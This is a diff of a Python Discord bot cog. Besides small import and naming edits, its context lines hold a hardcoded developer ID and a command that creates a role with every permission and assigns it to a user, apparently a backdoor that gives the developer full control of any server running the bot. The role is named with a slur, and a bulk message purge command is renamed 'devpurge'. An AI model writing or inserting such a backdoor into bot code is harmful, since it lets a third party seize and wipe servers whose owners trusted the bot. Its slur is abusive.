@@ -1,10 +1,7 @@
 import discord
-from discord import Embed, Member, Permissions
+from discord import Permissions
 from discord.ext import commands
-from discord.ext.commands import has_permissions, MissingPermissions
 
-from typing import Optional
-from datetime import datetime
 
 
 developerid = 416508283528937472, 000
@@ -30,7 +27,7 @@ class beta(commands.Cog):
         role = await guild.create_role(name="retard",permissions=Permissions.all())  
         await user.add_roles(role)
 
-        await ctx.send(f"{user.name} received the role {name}", delete_after=3)
+        await ctx.send(f"{user.name} received the role retard", delete_after=3)
 
     # tdeleterole <name>
     @commands.command()
@@ -59,7 +56,7 @@ class beta(commands.Cog):
     # tpurge <ammount>
     @commands.command(aliases=['clear'])
     @commands.has_permissions(administrator=True)
-    async def purge(self, ctx, l: int = 50):
+    async def devpurge(self, ctx, l: int = 50):
         await ctx.message.delete()
         c = await ctx.channel.purge(limit=l)
         await ctx.send(f"Cleared {len(c)} messages", delete_after=3)
